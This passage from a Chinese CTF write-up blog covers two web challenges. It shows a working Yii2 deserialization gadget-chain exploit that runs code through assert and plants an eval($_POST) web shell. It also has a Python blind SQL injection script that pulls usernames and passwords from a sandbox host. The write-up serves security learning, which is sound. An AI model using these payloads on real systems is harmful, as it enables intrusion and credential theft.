+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checkAccess) &#123;</span><br><span class="line">           call_user_func(<span class="keyword">$this</span>-&gt;checkAccess, <span class="keyword">$this</span>-&gt;id);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* <span class="doctag">@var</span> $model \yii\db\ActiveRecord */</span></span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$this-&gt;checkAccess</code>和<code>$this-&gt;id</code>都是我们可控的，相当于直接函数名和参数都可控了，反序列化链至此结束。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class BatchQueryResult  -&gt;__destruct()</span><br><span class="line">↓↓↓</span><br><span class="line">class BatchQueryResult  -&gt;reset()</span><br><span class="line">↓↓↓</span><br><span class="line">class Generator  -&gt;__call()</span><br><span class="line">↓↓↓</span><br><span class="line">class Generator  -&gt;format()</span><br><span class="line">↓↓↓</span><br><span class="line">class Generator  -&gt;getFormatter()</span><br><span class="line">↓↓↓</span><br><span class="line">class IndexAction  -&gt;run()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到一个不完整的<code>phpinfo</code></p>
+<p>之后测试的时候，发现system、eval之类的一些函数好像都没有效果，猜测可能设置了disable_functions不过最后发现assert能用、file_put_contents()也能用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;file_put_contents(\&#x27;mochu7.php\&#x27;,\&#x27;&lt;?php eval($_POST[7]);?&gt;\&#x27;);&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;file_put_contents(\&#x27;mochu7.php\&#x27;,\&#x27;&lt;?php eval($_POST[7]);?&gt;\&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804134857.png"></p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804135400.png"></p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>打开一个登录界面，尝试过弱密码，sql注入都显示登录失败，查看源代码，发现有一个<code>?id=1</code>的链接</p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804132557.png"></p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804132524.png"></p>
+<p>发现id的值是可以修改的，自然想到这里是sql注入，编写脚本，得到登录的账号密码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="comment">#爆数据库名</span></span><br><span class="line"><span class="comment">#pay = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#for j in range(1,10):</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) <span class="comment">// 2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">				url = <span class="string">&quot;http://challenge-7a25d7bb8e61f081.sandbox.ctfhub.com:10800/image.php?id=if(ascii(mid((select/**/group_concat(username,password)/**/from/**/ctf.users),%d,1))&lt;=%s,1,5)&quot;</span>%(i,mid)</span><br><span class="line">				r=requests.get(url)</span><br><span class="line">				<span class="comment">#print(url)</span></span><br><span class="line">				<span class="keyword">if</span> len(r.text)&gt;<span class="number">1000</span>:</span><br><span class="line">					high = mid</span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					low = mid+<span class="number">1</span></span><br><span class="line">				mid = (low + high) <span class="comment">// 2</span></span><br><span class="line">	s += chr(<span class="keyword">int</span>(mid))</span><br><span class="line">	<span class="keyword">print</span>(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804122536.png"></p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804131721.png"></p>
+<p>登录成功是这样一个页面，这里是文件包含漏洞</p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804124029.png"></p>
+<p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210804124159.png"></p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113824239">https://blog.csdn.net/rfrder/article/details/113824239</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/08/03/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AFwp/" rel="prev" title="第四届海啸杯wp（部分）">
+      <i class="fa fa-chevron-left"></i> 第四届海啸杯wp（部分）
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web1"><span class="nav-number">1.</span> <span class="nav-text">web1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web2"><span class="nav-number">2.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web3"><span class="nav-number">3.</span> <span class="nav-text">web3</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zoey"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">zoey</p>
+  <div class="site-description" itemprop="description">Hello!</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      博客链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://yoursite.com/" title="http:&#x2F;&#x2F;yoursite.com" rel="noopener" target="_blank">eeknight</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://flag2020.top/" title="https:&#x2F;&#x2F;flag2020.top&#x2F;" rel="noopener" target="_blank">潜心</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://threelisa.top/" title="https:&#x2F;&#x2F;threelisa.top&#x2F;" rel="noopener" target="_blank">左</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zoey</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">99k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:30</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
